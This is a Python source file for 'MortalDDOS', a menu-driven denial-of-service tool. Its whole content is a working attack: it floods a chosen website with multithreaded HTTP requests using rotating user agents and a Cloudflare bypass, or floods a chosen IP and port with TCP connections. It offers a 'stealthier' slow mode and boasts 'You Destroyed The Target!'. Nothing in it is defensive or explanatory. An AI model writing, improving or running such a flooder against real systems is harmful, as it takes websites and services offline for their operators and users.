import threading
import sys
import time
import os
import socket
import re

try:
    import requests
except ImportError:
    requests = None

try:
    import cloudscraper
    CF_BYPASS = True
except ImportError:
    cloudscraper = None
    CF_BYPASS = False

def color_fade(start, end, steps):
    gradient = []
    for i in range(steps):
        r = int(start[0] + (end[0] - start[0]) * (i / max(steps-1, 1)))
        g = int(start[1] + (end[1] - start[1]) * (i / max(steps-1, 1)))
        b = int(start[2] + (end[2] - start[2]) * (i / max(steps-1, 1)))
        gradient.append(f"\033[38;2;{r};{g};{b}m")
    return gradient

class SimpleUI:
    COLOR_FADE = color_fade((255, 255, 255), (255, 0, 0), 7)

    WHITE = '\033[97m'
    RED = '\033[91m'
    ORANGE = '\033[31m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    CLEAR = '\033c'

    @staticmethod
    def banner():
        banner_lines = [
            "███╗   ███╗ ██████╗ ██████╗ ████████╗ █████╗ ██╗     ██████╗ ██████╗  ██████╗ ███████╗",
            "████╗ ████║██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝",
            "██╔████╔██║██║   ██║██████╔╝   ██║   ███████║██║     ██║  ██║██║  ██║██║   ██║███████╗",
            "██║╚██╔╝██║██║   ██║██╔══██╗   ██║   ██╔══██║██║     ██║  ██║██║  ██║██║   ██║╚════██║",
            "██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗██████╔╝██████╔╝╚██████╔╝███████║",
            "╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"
            "                                                     | made by Mortal Team | https://discord.gg/Grd7uKgtMV |                                 "
        ]
        print(SimpleUI.CLEAR, end="")
        print(SimpleUI.BOLD, end="")
        fade_colors = color_fade((255, 255, 255), (255, 0, 0), len(banner_lines))
        for idx, line in enumerate(banner_lines):
            color = fade_colors[idx]
            print(color + line.center(64) + SimpleUI.RESET)
        print('\n')

    @staticmethod
    def input_box(prompt):
        try:
            return input(f"{SimpleUI.ORANGE}{prompt}: {SimpleUI.RESET}")
        except KeyboardInterrupt:
            print()
            SimpleUI.log("Input cancelled by user", success=False)
            sys.exit(1)

    @staticmethod
    def option_box(options):
        for i, opt in enumerate(options, 1):
            fade_steps = len(options)
            fade = color_fade((255,200,60), (182,36,36), fade_steps)
            color = fade[i-1]
            print(f"{color}[{i}]{SimpleUI.RESET} {SimpleUI.WHITE}{opt}{SimpleUI.RESET}")
        print()

    @staticmethod
    def log(msg, success=True):
        tag = "[+]" if success else "[!]"
        color = SimpleUI.ORANGE if success else SimpleUI.RED
        print(f"{SimpleUI.BOLD}{color}{tag} {msg}{SimpleUI.RESET}")

    @staticmethod
    def divider():
        chars = 87
        fade = color_fade((255,200,70), (180,40,40), chars)
        divline = ""
        for i in range(chars):
            divline += f"{fade[i]}-"
        print(divline + SimpleUI.RESET)

    @staticmethod
    def panel_header(text):
        fade = color_fade((255,140,0), (182,36,36), max(5, len(text)))
        header = "-- "
        for idx, ch in enumerate(text):
            cidx = int(idx * (len(fade)-1) / max(len(text)-1,1))
            header += f"{fade[cidx]}{ch}"
        header += f"{SimpleUI.RED} --{SimpleUI.RESET}\n"
        print(f"\n{SimpleUI.BOLD}{header}")

    @staticmethod
    def small_success(msg):
        SimpleUI.log(msg, success=True)

Mozilla_User_Agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.19041",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Linux; Android 9; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

stop_flag = threading.Event()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def ddos_request(url_or_ip, counter, log_lock, delay, total_requests, target_type, port=80):
    use_cloudscraper = False
    session = None
    if target_type == 'website':
        if CF_BYPASS and cloudscraper is not None:
            use_cloudscraper = True
            session = cloudscraper.create_scraper()
        elif requests is not None:
            session = requests.Session()
    for i in range(counter):
        if stop_flag.is_set():
            break
        if target_type == 'website':
            headers = {
                "User-Agent": Mozilla_User_Agents[i % len(Mozilla_User_Agents)]
            }
            try:
                if use_cloudscraper:
                    response = session.get(url_or_ip, headers=headers, timeout=12)
                else:
                    response = session.get(url_or_ip, headers=headers, timeout=5)
                status = getattr(response, 'status_code', 200)
                log_str = f"[HTTP] {i+1}/{total_requests} to {url_or_ip} [{status}]"
                success = int(status) < 400
            except Exception as e:
                log_str = f"[ERR] {i+1}/{total_requests} failed: {str(e)}"
                success = False
        elif target_type == 'ip':
            try:
                with socket.create_connection((url_or_ip, port), timeout=5) as sock:
                    if port in (80, 8080, 8000):
                        sock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % url_or_ip.encode())
                    else:
                        sock.sendall(b"flood")
                log_str = f"[TCP] {i+1}/{total_requests} sent to {url_or_ip}:{port}"
                success = True
            except Exception as e:
                log_str = f"[ERR] TCP {port} {i+1}/{total_requests} to {url_or_ip}:{port} failed: {str(e)}"
                success = False
        else:
            log_str = "[ERR] Unknown target type."
            success = False

        with log_lock:
            SimpleUI.log(log_str, success=success)
        if delay > 0:
            time.sleep(delay)

def colorize_ascii_art(art, start_rgb=(255,200,60), end_rgb=(182,36,36)):
    lines = art.strip("\n").split("\n")
    fade = color_fade(start_rgb, end_rgb, len(lines))
    out = ""
    for idx, line in enumerate(lines):
        out += fade[idx] + line.rstrip() + SimpleUI.RESET + "\n"
    return out

def print_end_divider():
    end_divider_ascii = r"""
---------------------------------------------------------------------------------------
|\      _,,,---,,_      
ZZZzz /,`.-'`'    -.  ;-;;,_   _______ 
     |,4-  ) )-,_. ,\ (  `'-' |       |
    '---''(_/--'  `-'\_)      | [I]   |
                 //           |  ___  |
                //            | /   \ |
               //             |/ŻUBER\|
              //              \_______/⠀⠀⠀⠀⠀⠀⠀⠀
"""
    print(colorize_ascii_art(end_divider_ascii, start_rgb=(255, 255, 255), end_rgb=(255, 0, 0)) + SimpleUI.RESET)

def ddos_attack(target, total_requests, mode, target_type, port=80):
    SimpleUI.divider()
    desc = f"IP {target}:{port}" if target_type == "ip" else target
    SimpleUI.panel_header("Attack Started")
    if target_type == "website" and CF_BYPASS and cloudscraper is not None:
        SimpleUI.small_success("Cloudflare Bypass: ENABLED (cloudscraper installed)")
    elif target_type == "website" and requests is None:
        SimpleUI.log("No HTTP backend found, please install requests or cloudscraper!", success=False)
        return
    elif target_type == "website" and cloudscraper is None:
        SimpleUI.small_success("Cloudflare Bypass: NOT enabled (cloudscraper not installed)")

    SimpleUI.log(f"Mode: {mode}  Target: {desc}  Total: {total_requests}")
    SimpleUI.divider()
    threads = []
    log_lock = threading.Lock()
    if mode == "Fast":
        num_threads = min(200, total_requests)
        delay = 0.0
    else:
        num_threads = min(8, total_requests)
        delay = 0.7

    per_thread = total_requests // num_threads
    leftovers = total_requests % num_threads

    SimpleUI.small_success("Launching attack threads...")

    print("\nSending Threads....\n")

    chars = 87
    fade = color_fade((255, 255, 255), (255, 0, 0), chars)
    divline = ""
    for i in range(chars):
        divline += f"{fade[i]}-"
    print(divline + SimpleUI.RESET + "\n")

    ascii_art = r"""
|\      _,,,---,,_
ZZZzz /,`.-'`'    -.  ;-;;,_
     |,4-  ) )-,_. ,\ (  `'-'
    '---''(_/--'  `-'\_)⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

    print(colorize_ascii_art(ascii_art) + SimpleUI.RESET)
    print(divline + SimpleUI.RESET + "\n")

    for i in range(num_threads):
        this_thread_qty = per_thread + (1 if i < leftovers else 0)
        args = (target, this_thread_qty, log_lock, delay, total_requests, target_type)
        if target_type == "ip":
            args += (port,)
        t = threading.Thread(target=ddos_request, args=args)
        threads.append(t)

    try:
        for t in threads:
            t.start()
    except Exception as e:
        SimpleUI.log(f"Thread start error: {e}", success=False)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop_flag.set()
        SimpleUI.log("User requested stop. Stopping attack...", success=False)

    print_end_divider()

    SimpleUI.panel_header('\x1b[97mAttack \x1b[91mFinished\x1b[0m')
    SimpleUI.log("You Destroyed The Target!")
    SimpleUI.log('\033[91mThank You For \033[97mUsing MortalDDOS\033[0m')
    SimpleUI.log("For More Tools, Visit: https://dc.gg/KapiczeK")
    SimpleUI.divider()
    input("Press ENTER to return to main menu...")

def is_valid_ip(ip):
    pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
    if not re.match(pattern, ip):
        return False
    parts = ip.split('.')
    return all(p.isdigit() and 0 <= int(p) <= 255 for p in parts)

def get_attack_params():
    SimpleUI.divider()
    SimpleUI.panel_header("Choose Attack Type")
    SimpleUI.option_box(["DDoS a Website", "DDoS an IP Address"])

    while True:
        typ_sel = input(
            SimpleUI.ORANGE + "Target [1=Website, 2=IP]: " + SimpleUI.RESET
        )
        tsel = typ_sel.strip()
        if tsel == "1":
            target_type = "website"
            break
        elif tsel == "2":
            target_type = "ip"
            break
        SimpleUI.log("Pick 1 or 2! [1=Website, 2=IP Address]", success=False)

    if target_type == "website":
        if not (requests or cloudscraper):
            SimpleUI.log("Please install 'requests' or 'cloudscraper' to target websites! [pip install requests/cloudscraper] (or use the install.bat file)", success=False)
            return None, None, None, None, None
        while True:
            url = SimpleUI.input_box("Enter target URL (include http/https)").strip()
            if not url.lower().startswith(("http://", "https://")):
                SimpleUI.log("URL must start with http:// or https://", success=False)
                continue
            SimpleUI.small_success(f"Target website set: {url}")
            break
        target = url
        port = None
    else:
        while True:
            ip = SimpleUI.input_box("Enter target IP address (IPv4)").strip()
            if not is_valid_ip(ip):
                SimpleUI.log("Invalid IPv4 address!", success=False)
                continue
            SimpleUI.small_success(f"Target IP set: {ip}")
            break
        while True:
            port_text = SimpleUI.input_box("Enter port to attack (default 80)").strip()
            if port_text == "":
                port = 80
                SimpleUI.small_success(f"Port set to 80")
                break
            try:
                port = int(port_text)
                if 1 <= port <= 65535:
                    SimpleUI.small_success(f"Port set to {port}")
                    break
                else:
                    SimpleUI.log("Port must be 1-65535!", success=False)
            except:
                SimpleUI.log("Invalid port number!", success=False)
        target = ip

    SimpleUI.divider()
    SimpleUI.panel_header("Pick Attack Speed")
    SimpleUI.option_box(["Fast (Best for max flood)", "Slow (For stealthier flood)"])
    while True:
        mode_sel = input(
            SimpleUI.ORANGE + "Pick mode [1/2]: " + SimpleUI.RESET
        )
        if mode_sel.strip() in ("1", "2"):
            mode = "Fast" if mode_sel == "1" else "Slow"
            SimpleUI.small_success(f"{mode} mode selected")
            break
        SimpleUI.log("Pick 1 or 2!", success=False)

    while True:
        req_str = SimpleUI.input_box("Number of requests to send (e.g. 1000)")
        try:
            num = int(req_str)
            if num > 0:
                SimpleUI.small_success(f"Requests to send: {num}")
                break
            else:
                SimpleUI.log("Enter a positive number!", success=False)
        except:
            SimpleUI.log("Invalid number entered!", success=False)

    time.sleep(0.15)

    if target_type == "website":
        return target, num, mode, target_type, None
    else:
        return target, num, mode, target_type, port

def main_menu():
    while True:
        clear_screen()
        SimpleUI.banner()
        SimpleUI.divider()
        print(f"{SimpleUI.RED}{SimpleUI.BOLD}Pick an option:{SimpleUI.RESET}")
        SimpleUI.divider()
        SimpleUI.option_box([
            "DDOS a Website Domain or an IP Address",
            "Exit"
        ])
        choice = input(SimpleUI.ORANGE + "\nWhat do you want to do? [1/2]: " + SimpleUI.RESET)
        if choice == "1":
            target, total_requests, mode, target_type, port = get_attack_params()
            if target_type == "website" and target and total_requests:
                ddos_attack(target, total_requests, mode, target_type)
            elif target_type == "ip":
                ddos_attack(target, total_requests, mode, target_type, port)
        elif choice == "2":
            clear_screen()
            print(f"{SimpleUI.WHITE}{SimpleUI.BOLD}\nNever wanted to destroy the web?!\n{SimpleUI.RESET}")
            sys.exit(0)
        else:
            SimpleUI.log("Pick 1 or 2!", success=False)
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
